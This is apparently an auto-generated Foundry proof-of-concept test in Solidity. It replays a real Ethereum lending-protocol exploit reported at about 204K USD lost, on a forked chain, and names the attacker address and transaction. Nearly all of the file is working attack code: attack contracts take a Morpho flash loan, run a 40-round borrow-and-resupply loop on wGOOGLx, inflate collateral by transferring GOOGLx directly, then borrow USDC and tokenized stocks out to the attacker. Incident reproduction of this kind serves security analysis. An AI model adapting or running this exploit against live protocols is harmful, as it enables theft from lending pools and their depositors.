// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 204.14K USD
// Attacker : 0x58428161bb55c14a413945f06cbdec157f411c76
// Attack Contract : 0x8b2af1a9885e4755d22ce4a49f7a525a33f1c9e4
// Vulnerable Contract : N/A
// Attack Tx : 0xe2320086b2815d21b0927839bd0e306466c29a68d38d5361e99dd21ec5472612
// Block : 25434062
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 204.14K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.A_1F05C7_7167;
    uint256 constant FORK_BLOCK = 25434061;
    uint256 constant TX_TIMESTAMP = 1782865487;
    uint256 constant TX_BLOCK_NUMBER = 25434062;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfitSnap();
        _logBalances("Before exploit");
        _deployAttack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignAttackerNonceF();
        attack = new OurAttack();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignAttackerNonceF() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareProfitSnap() internal {
        _prepareProfit(ATTACK_CONTRACT, _lendingChild());
    }

    function _lendingChild() internal pure returns (address) {
        return Addresses.attack_path_entry;
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _createdLendingChild(attack));
    }

    function _createdLendingChild(OurAttack attack) internal view returns (address) {
        return address(attack.lendingChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wMSTRx, "wMSTRx", 293123092617121394703);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wTSLAx, "wTSLAx", 37589277017463227843);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wNVDAx, "wNVDAx", 99854367795581762710);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 204215572188);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wSPYx, "wSPYx", 122196850288612833306);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wQQQx, "wQQQx", 62969726160938091585);
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwQQQx,
            "variableDebtwQQQx",
            62969726160938091585
        );
        _expectProfit(Addresses.attack_path_entry, attackChild, Addresses.ewGOOGLx, "ewGOOGLx", 56595561022306344560);
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwNVDAx,
            "variableDebtwNVDAx",
            99854367795581762710
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwTSLAx,
            "variableDebtwTSLAx",
            37589277017463227843
        );
        _expectProfit(
            Addresses.attack_path_entry, attackChild, Addresses.variableDebtUSDC, "variableDebtUSDC", 384215572188
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwSPYx,
            "variableDebtwSPYx",
            122196850288612833306
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwMSTRx,
            "variableDebtwMSTRx",
            293123092617121394703
        );
        _expectProfit(
            Addresses.attack_child, attack, Addresses.variableDebtwGOOGLx, "variableDebtwGOOGLx", 58010450047864003174
        );
        _expectProfit(Addresses.attack_child, attack, Addresses.eUSDC, "eUSDC", 180000000000);
    }
}

contract OurAttack {
    AttackChild public lendingChild;

    AttackChild_1 public morphoChild;

    constructor() payable {
        lendingChild = new AttackChild();
        require(address(lendingChild) == Addresses.attack_path_entry, "unexpected attack child");
        lendingChild.approveLendingPool();

        morphoChild = new AttackChild_1();
        require(address(morphoChild) == Addresses.attack_child, "unexpected attack child");
        morphoChild.execute(abi.encode(Addresses.attack_path_entry));
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x8259ef5f) {
            uint256 assetWord;
            assembly {
                assetWord := calldataload(4)
            }

            if (assetWord == uint256(uint160(Addresses.USDC))) {
                borrowUsdc();
                return;
            }
            if (assetWord == uint256(uint160(Addresses.wSPYx))) {
                borrowSpy();
                return;
            }
            if (assetWord == uint256(uint160(Addresses.wQQQx))) {
                borrowQqq();
                return;
            }
            if (assetWord == uint256(uint160(Addresses.wMSTRx))) {
                borrowMstr();
                return;
            }
            if (assetWord == uint256(uint160(Addresses.wNVDAx))) {
                borrowNvda();
                return;
            }
            if (assetWord == uint256(uint160(Addresses.wTSLAx))) {
                borrowTsla();
                return;
            }
            borrowUsdc();
            return;
        }
        if (msg.sig == 0xc1d5a727) {
            supplyGoog();
        }
    }

    function supplyCollateral() external payable {
        supplyGoog();
    }

    function flashLoanCallback2() external payable {
        borrowUsdc();
    }

    function flashLoanCallback5() external payable {
        borrowSpy();
    }

    function flashLoanCallback4() external payable {
        borrowQqq();
    }

    function flashLoanCallback6() external payable {
        borrowMstr();
    }

    function flashLoanCallback3() external payable {
        borrowNvda();
    }

    function flashLoanCallback() external payable {
        borrowTsla();
    }

    function replayProfit() external {
        if (!_settleDone(0, 22)) {
            bool __settlementAlreadyMaterialized0_22 = false;
            if (Harness.safeBalance(Addresses.wTSLAx, Addresses.attacker_eoa) >= 37589277017463227843) {
                _markSettle(0, 22);
                __settlementAlreadyMaterialized0_22 = true;
            }
            if (!__settlementAlreadyMaterialized0_22) {
                _markSettle(0, 22);
                uint256 settleAmount = 37589277017463227843;
                IERC20Like(Addresses.wTSLAx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(2, 22)) {
            bool __settlementAlreadyMaterialized2_22 = false;
            if (Harness.safeBalance(Addresses.wNVDAx, Addresses.attacker_eoa) >= 99854367795581762710) {
                _markSettle(2, 22);
                __settlementAlreadyMaterialized2_22 = true;
            }
            if (!__settlementAlreadyMaterialized2_22) {
                _markSettle(2, 22);
                uint256 settleAmount = 99854367795581762710;
                IERC20Like(Addresses.wNVDAx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(3, 22)) {
            bool __settlementAlreadyMaterialized3_22 = false;
            if (Harness.safeBalance(Addresses.wQQQx, Addresses.attacker_eoa) >= 62969726160938091585) {
                _markSettle(3, 22);
                __settlementAlreadyMaterialized3_22 = true;
            }
            if (!__settlementAlreadyMaterialized3_22) {
                _markSettle(3, 22);
                uint256 settleAmount = 62969726160938091585;
                IERC20Like(Addresses.wQQQx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(4, 22)) {
            bool __settlementAlreadyMaterialized4_22 = false;
            if (Harness.safeBalance(Addresses.wSPYx, Addresses.attacker_eoa) >= 122196850288612833306) {
                _markSettle(4, 22);
                __settlementAlreadyMaterialized4_22 = true;
            }
            if (!__settlementAlreadyMaterialized4_22) {
                _markSettle(4, 22);
                uint256 settleAmount = 122196850288612833306;
                IERC20Like(Addresses.wSPYx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(5, 22)) {
            bool __settlementAlreadyMaterialized5_22 = false;
            if (Harness.safeBalance(Addresses.wMSTRx, Addresses.attacker_eoa) >= 293123092617121394703) {
                _markSettle(5, 22);
                __settlementAlreadyMaterialized5_22 = true;
            }
            if (!__settlementAlreadyMaterialized5_22) {
                _markSettle(5, 22);
                uint256 settleAmount = 293123092617121394703;
                IERC20Like(Addresses.wMSTRx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function borrowTsla() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wTSLAx, 37589277017463227843, 2, uint16(0), address(this));
        IERC20Like(Addresses.wTSLAx).transfer(Addresses.attacker_eoa, 37589277017463227843);
    }

    function borrowUsdc() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6).borrow(Addresses.USDC, 384215572188, 2, uint16(0), address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attack_child, 384215572188);
    }

    function borrowNvda() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wNVDAx, 99854367795581762710, 2, uint16(0), address(this));
        IERC20Like(Addresses.wNVDAx).transfer(Addresses.attacker_eoa, 99854367795581762710);
    }

    function borrowQqq() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wQQQx, 62969726160938091585, 2, uint16(0), address(this));
        IERC20Like(Addresses.wQQQx).transfer(Addresses.attacker_eoa, 62969726160938091585);
    }

    function borrowSpy() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wSPYx, 122196850288612833306, 2, uint16(0), address(this));
        IERC20Like(Addresses.wSPYx).transfer(Addresses.attacker_eoa, 122196850288612833306);
    }

    function borrowMstr() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wMSTRx, 293123092617121394703, 2, uint16(0), address(this));
        IERC20Like(Addresses.wMSTRx).transfer(Addresses.attacker_eoa, 293123092617121394703);
    }

    function supplyGoog() internal {
        uint256 supplyAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6).supply(Addresses.wGOOGLx, supplyAmount, address(this), uint16(0));
    }

    function approveLendingPool() public {
        IERC20Like(Addresses.wGOOGLx).approve(Addresses.A_3EEEB3_FAA6, type(uint256).max);
    }
}

contract AttackChild_1 {
    receive() external payable {}

    function execute(bytes calldata attackChildData) external payable {
        attackChildData;
        startMorphoFlashLoan();
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackData) external payable {
        amount;
        callbackData;
        if (!_replayDone[REPLAY_CALLBACK_11]) flashCallback2();
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function attackChildCb() external payable {
        startMorphoFlashLoan();
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_11]) flashCallback2();
    }

    function replayProfit() external {
        if (!_settleDone(0, 36)) {
            bool __settlementAlreadyMaterialized0_36 = false;
            if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 204215572188) {
                _markSettle(0, 36);
                __settlementAlreadyMaterialized0_36 = true;
            }
            if (!__settlementAlreadyMaterialized0_36) {
                _markSettle(0, 36);
                uint256 settleAmount = 204215572188;
                IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function startMorphoFlashLoan() internal {
        bytes memory flashLoanProof = abi.encode(Addresses.attack_path_entry);
        IMorpho(Addresses.Morpho).flashLoan(Addresses.USDC, 180000000000, flashLoanProof);

        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 usdcProfit = 204215572188;
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, usdcProfit);
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_11] = true;
        flashCallback3();
        flashCallback9();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.A_3EEEB3_FAA6, type(uint256).max);
        uint256 usdcSupplyAmount = 180000000000;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.USDC, usdcSupplyAmount, address(this), uint16(0));

        IERC20Like(Addresses.wGOOGLx).balanceOf(Addresses.ewGOOGLx);
        uint256 wGOOGLxAmount = 1414889025557658614;
        for (uint256 i = 0; i < 40; i++) {
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, wGOOGLxAmount, 2, uint16(0), address(this));
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxAmount);
            _callLendingChild(abi.encodeWithSelector(bytes4(0xc1d5a727), wGOOGLxAmount));
        }

        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wGOOGLx, wGOOGLxAmount, 2, uint16(0), address(this));
        IwGOOGLx(Addresses.wGOOGLx).redeem(wGOOGLxAmount, address(this), address(this));

        uint256 gOOGLxTransferAmount = 8489334153345952365;
        IERC20Like(Addresses.GOOGLx).transfer(Addresses.wGOOGLx, gOOGLxTransferAmount);
        IERC20Like(Addresses.USDC).balanceOf(Addresses.eUSDC);
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48),
                uint256(384215572188),
                uint256(0)
            )
        );
        IERC20Like(Addresses.wSPYx).balanceOf(Addresses.A_3B707B_7B5F);
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000c88fcd8b874fdb3256e8b55b3decb8c24eab4c02),
                uint256(122196850288612833306),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wQQQx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_44CA9E);
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000dbd9232fee15351068fe02f0683146e16d9f2cea),
                uint256(62969726160938091585),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wMSTRx).balanceOf(Addresses.A_854633_4EC0);
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000266e5923f6118f8b340ca5a23ae7f71897361476),
                uint256(293123092617121394703),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wNVDAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_706D86);
    }

    function flashCallback9() internal {
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x00000000000000000000000093e62845c1dd5822ebc807ab71a5fb750decd15a),
                uint256(99854367795581762710),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wTSLAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_E97B09);
        _callLendingChild(
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x00000000000000000000000043680abf18cf54898be84c6ef78237cfbd441883),
                uint256(37589277017463227843),
                uint256(1)
            )
        );
        uint256 usdcRepayment = 180000000000;
        IERC20Like(Addresses.USDC).approve(Addresses.Morpho, usdcRepayment);
    }

    function _callLendingChild(bytes memory data) internal {
        (bool ok,) = Addresses.attack_path_entry.call(data);
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant variableDebtwQQQx = 0x0C68a8B383F81653DF0c3f0dcEad0c77091315B9; // Addresses.variableDebtwQQQx = 0x0c68a8b383f81653df0c3f0dcead0c77091315b9 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtwQQQx roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant stableDebtwNVDAx = 0x0dFf8FE6A5fd6c1DC3293c20E650FA5CA5fE7685; // Addresses.stableDebtwNVDAx = 0x0dff8fe6a5fd6c1dc3293c20e650fa5ca5fe7685 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtwNVDAx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ewGOOGLx = 0x0eC96784aA6f47E456E0Ce4eB2a8B00F1A6C9b74; // Addresses.ewGOOGLx = 0x0ec96784aa6f47e456e0ce4eb2a8b00f1a6c9b74 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=ewGOOGLx roles=asset|contract|economic_asset|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant wBTI = 0x14f37168AB9eAFCD94d5b142a00E6e9B261Bad48; // Addresses.wBTI = 0x14f37168ab9eafcd94d5b142a00e6e9b261bad48 label=unresolved token_symbol=wBTI roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant wGOOGLx = 0x1630F08370917E79df0B7572395a5e907508bBBc; // Addresses.wGOOGLx = 0x1630f08370917e79df0b7572395a5e907508bbbc label=unresolved token_symbol=wGOOGLx roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_1F05C7_7167 = 0x1F05c70Db2fFa1B1BAc62b27e7678B765ebe7167; // Addresses.A_1F05C7_7167 = 0x1f05c70db2ffa1b1bac62b27e7678b765ebe7167 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant wMSTRx = 0x266E5923F6118F8b340cA5a23AE7f71897361476; // Addresses.wMSTRx = 0x266e5923f6118f8b340ca5a23ae7f71897361476 label=WrappedBackedTokenProxy token_symbol=wMSTRx roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant variableDebtwNVDAx = 0x2b7a37f1669a4E616704d65f0ddC653347BA8901; // Addresses.variableDebtwNVDAx = 0x2b7a37f1669a4e616704d65f0ddc653347ba8901 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtwNVDAx roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant DefaultReserveInterestRateStrategy = 0x30D1bBa26326b5D0d1318F490F2F964701E0091c; // Addresses.DefaultReserveInterestRateStrategy = 0x30d1bba26326b5d0d1318f490f2f964701e0091c label=DefaultReserveInterestRateStrategy roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_32A321_F990 = 0x32A321B8e05B56e7450DBa16B11e1739CFD6f990; // Addresses.A_32A321_F990 = 0x32a321b8e05b56e7450dba16b11e1739cfd6f990 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant A_3410D5_4D9D = 0x3410d58030CBe273f1D6B8fCFa2cF1D6f8224d9D; // Addresses.A_3410D5_4D9D = 0x3410d58030cbe273f1d6b8fcfa2cf1d6f8224d9d label=unresolved roles=sender source=unresolved confidence=low
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_3885D7 =
        0x3885d7FE5745c2A94CaBA576c84463a3fbDe72Ba; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_3885D7 = 0x3885d7fe5745c2a94caba576c84463a3fbde72ba label=InitializableImmutableAdminUpgradeabilityProxy roles=asset|contract source=etherscan_v2 confidence=high
    address internal constant A_3B707B_7B5F = 0x3B707b904841579d81e0e5bd71e65DaA269E7B5F; // Addresses.A_3B707B_7B5F = 0x3b707b904841579d81e0e5bd71e65daa269e7b5f label=unresolved roles=observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_3EEEB3_FAA6 = 0x3EEeB3cd20f844a578807fc457388Ceb9A67fAa6; // Addresses.A_3EEEB3_FAA6 = 0x3eeeb3cd20f844a578807fc457388ceb9a67faa6 label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant variableDebtwGOOGLx = 0x41D25b8918d3dc4De807D56FD43A82854036714b; // Addresses.variableDebtwGOOGLx = 0x41d25b8918d3dc4de807d56fd43a82854036714b label=variableDebtwGOOGLx token_symbol=variableDebtwGOOGLx roles=asset|contract|economic_asset|profit_asset|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd; // Addresses.FiatTokenV2_2 = 0x43506849d7c04f9138d1a2050bbf3a0c054402dd label=FiatTokenV2_2 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant wTSLAx = 0x43680aBF18cf54898Be84C6eF78237CFBD441883; // Addresses.wTSLAx = 0x43680abf18cf54898be84c6ef78237cfbd441883 label=WrappedBackedTokenProxy token_symbol=wTSLAx roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_44CA9E =
        0x44cA9E30b96fF05D5E4AA44A295F15954E47cA1b; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_44CA9E = 0x44ca9e30b96ff05d5e4aa44a295f15954e47ca1b label=InitializableImmutableAdminUpgradeabilityProxy roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant stableDebtUSDC = 0x49C700c3F79Cc405cc3cCec382B2Fd11eCFdB826; // Addresses.stableDebtUSDC = 0x49c700c3f79cc405cc3ccec382b2fd11ecfdb826 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtUSDC roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_4C2C9D_4CE2 = 0x4C2c9DF4559d80E0a7aA3C7F281704A7992f4CE2; // Addresses.A_4C2C9D_4CE2 = 0x4c2c9df4559d80e0a7aa3c7f281704a7992f4ce2 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant STABLE_DEBT_TOKEN_IMPL = 0x4f8F2946A09a7137EA72f7f79261Bf8f77F0d5e0; // Addresses.STABLE_DEBT_TOKEN_IMPL = 0x4f8f2946a09a7137ea72f7f79261bf8f77f0d5e0 label=StableDebtToken token_symbol=STABLE_DEBT_TOKEN_IMPL roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant stableDebtwGOOGLx = 0x5229548877C3126a1Ac40f2A1C05e50376570733; // Addresses.stableDebtwGOOGLx = 0x5229548877c3126a1ac40f2a1c05e50376570733 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtwGOOGLx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_56B595_2DA9 = 0x56B5958f237880D59E85D9EBCC0A03208B742Da9; // Addresses.A_56B595_2DA9 = 0x56b5958f237880d59e85d9ebcc0a03208b742da9 label=unresolved roles=code_contract source=unresolved confidence=low
    address internal constant stableDebtwSPYx = 0x575beE50e591a493DC2D5f4D8fBf2741873Db06A; // Addresses.stableDebtwSPYx = 0x575bee50e591a493dc2d5f4d8fbf2741873db06a label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtwSPYx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x58428161bB55c14A413945f06cbDeC157F411C76; // Addresses.attacker_eoa = 0x58428161bb55c14a413945f06cbdec157f411c76 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant variableDebtwTSLAx = 0x5e26CAbe36Ed4Ae82f60e3c2c9dF6c7df63F3569; // Addresses.variableDebtwTSLAx = 0x5e26cabe36ed4ae82f60e3c2c9df6c7df63f3569 label=variableDebtwTSLAx token_symbol=variableDebtwTSLAx roles=asset|contract|economic_asset|profit_asset|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant variableDebtUSDC = 0x6D35b645a83F86B79D093DE3e8aC41e0df5E03B6; // Addresses.variableDebtUSDC = 0x6d35b645a83f86b79d093de3e8ac41e0df5e03b6 label=variableDebtUSDC token_symbol=variableDebtUSDC roles=asset|contract|economic_asset|profit_asset|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_706D86 =
        0x706D86fb27017df76c4777Ad987142838141eFf3; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_706D86 = 0x706d86fb27017df76c4777ad987142838141eff3 label=InitializableImmutableAdminUpgradeabilityProxy roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant stableDebtwMSTRx = 0x7f59Ef2f0694A60226CD7bC2131C3B293a478874; // Addresses.stableDebtwMSTRx = 0x7f59ef2f0694a60226cd7bc2131c3b293a478874 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtwMSTRx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant stableDebtwQQQx = 0x81B159d2e8Ca5c0BCf16de117D035b678A6Af7Cb; // Addresses.stableDebtwQQQx = 0x81b159d2e8ca5c0bcf16de117d035b678a6af7cb label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=stableDebtwQQQx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_854633_4EC0 = 0x854633708BCC6dFA0650CBf557B6ceB383564ec0; // Addresses.A_854633_4EC0 = 0x854633708bcc6dfa0650cbf557b6ceb383564ec0 label=unresolved roles=observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_869C39_CE59 = 0x869c3981db4F89C65BdB997021bD07C1a962CE59; // Addresses.A_869C39_CE59 = 0x869c3981db4f89c65bdb997021bd07c1a962ce59 label=unresolved roles=sender|storage_contract source=unresolved confidence=low
    address internal constant TSLAx = 0x8aD3c73F833d3F9A523aB01476625F269aEB7Cf0; // Addresses.TSLAx = 0x8ad3c73f833d3f9a523ab01476625f269aeb7cf0 label=unresolved token_symbol=TSLAx roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant attack_path_entry = 0x8b2Af1a9885E4755d22ce4A49f7A525a33f1C9e4; // Addresses.attack_path_entry = 0x8b2af1a9885e4755d22ce4a49f7a525a33f1c9e4 label=attack_path_entry roles=attack_path_entry_contract|attacker_contract|code_contract|contract|attack_child_contract|economic_holder|localized_contract|observed_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_9029BC_9818 = 0x9029bC7B5c9d74eD26Eaa6896062342d7bd19818; // Addresses.A_9029BC_9818 = 0x9029bc7b5c9d74ed26eaa6896062342d7bd19818 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant SPYx = 0x90A2a4c76b5D8c0bc892A69EA28Aa775a8f2dD48; // Addresses.SPYx = 0x90a2a4c76b5d8c0bc892a69ea28aa775a8f2dd48 label=BackedTokenProxy token_symbol=SPYx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant wNVDAx = 0x93E62845C1DD5822EbC807ab71A5Fb750DecD15A; // Addresses.wNVDAx = 0x93e62845c1dd5822ebc807ab71a5fb750decd15a label=WrappedBackedTokenProxy token_symbol=wNVDAx roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
